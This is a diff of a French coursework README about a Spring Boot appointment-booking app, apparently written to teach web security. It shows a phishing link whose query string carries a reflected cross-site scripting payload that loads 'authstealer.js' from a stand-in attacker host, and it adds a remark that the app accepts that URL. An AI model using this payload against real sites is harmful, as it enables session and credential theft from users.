@@ -59,3 +59,6 @@ Enfin, on crée le formulaire qui nous permet de modifier et ajouter des rdvs, o
 
 Si on imagine un problème de pishing quelconque qui nous conduit à cliquer sur un lien frauduleux : [I'm an fraudulent link](http://localhost:8080/rdvs?q=puppies%3Cscript%20src=%22http://mallorysevilsite.com/authstealer.js%22%3E%3C/script%3E)
 
+On voit que springboot permet d'acceder à cette url :
+
+![alt text](https://github.com/Sheecss/Ue_CyberApp_Ferretti/blob/main/img/rdv_service.PNG "Logo Title Text 1")
